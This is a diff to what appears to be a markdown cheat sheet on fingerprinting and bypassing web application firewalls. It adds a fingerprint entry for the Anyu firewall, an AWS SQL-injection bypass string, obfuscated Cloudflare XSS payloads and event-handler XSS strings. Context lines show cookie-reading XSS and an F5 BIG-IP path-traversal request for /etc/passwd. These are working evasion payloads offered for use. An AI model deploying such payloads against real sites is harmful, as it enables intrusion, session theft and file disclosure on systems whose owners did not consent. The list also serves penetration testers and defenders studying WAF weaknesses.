@@ -196,6 +196,22 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Anyu Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response content contains <code>Sorry! your access has been intercepted by AnYu</code></li>
+                    <li>Blocked response page contains <code>AnYu- the green channel</code> text.</li>
+                    <li>Response headers may contain unusual header <code>WZWS-RAY</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Application Security Manager (F5 Networks)
         </td>
         <td>
@@ -2452,6 +2468,12 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 %C0%80'+union+select+col1,col2,col3+from+table+--+
 ```
 
+### AWS
+- [SQLi Bypass](https://github.com/enkaskal/aws-waf-sqli-bypass-PoC) by [@enkaskal](https://twitter.com/enkaskal)
+```
+"; select * from TARGET_TABLE --
+```
+
 ### Barracuda 
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja)
 ```
@@ -2502,12 +2524,17 @@ http://host/index.php/wp-json/wp/v2/users/
 </soapenv:Envelope>
 ```
 
-- `generic_api_call.pl` XSS by [@NNPoster](https://www.exploit-db.com/?author=6654)
+- [`generic_api_call.pl` XSS](https://www.exploit-db.com/exploits/30777) by [@NNPoster](https://www.exploit-db.com/?author=6654)
 ```
 http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
 ``` 
 
 ### Cloudflare
+- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
+```
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+```
+
 - XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
@@ -2672,8 +2699,6 @@ Content-Type: application/x-www-form-urlencoded
 
 _form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
 ```
-- [F5 BIG-IP 11.6 SSL Virtual Server - 'Ticketbleed' Memory Disclosure](https://www.exploit-db.com/exploits/44446) by [@0x00String](https://www.exploit-db.com/?author=7028).
-- [F5 BIG-IP Remote Root Authentication Bypass Vulnerability](https://www.exploit-db.com/exploits/19091) by [@Rel1k](https://www.exploit-db.com/?author=1593).
 
 ### F5 FirePass
 - SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
@@ -2791,8 +2816,14 @@ value="<script>alert(document.cookie)</script>">
 </body>
 </html>
 ```
+- [Other XSS Bypasses](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+```
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+```
 
-### __Apache__ 
+### Apache Generic
 - Writing method type in lowercase by [@i_bo0om](http://twitter.com/i_bo0om)
 ```
 get /login HTTP/1.1
@@ -2800,7 +2831,7 @@ Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
-### IIS
+### IIS Generic
 - Tabs before method by [@i_bo0om](http://twitter.com/i_bo0om)
 ```
     GET /login.php HTTP/1.1
@@ -2885,6 +2916,7 @@ X-Remote-Addr: 127.0.0.1
 - [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
 - [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
 - [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com).
+- [ModSecurity SQL Injection Challenge: Lessons Learned](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) - By [@SpiderLabs](https://trustwave.com).
 - [XXE that can Bypass WAF](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0) - By [@WallArm](https://labs.wallarm.com).
 - [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com).
 - [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://twitter.com/sunnyhoi).
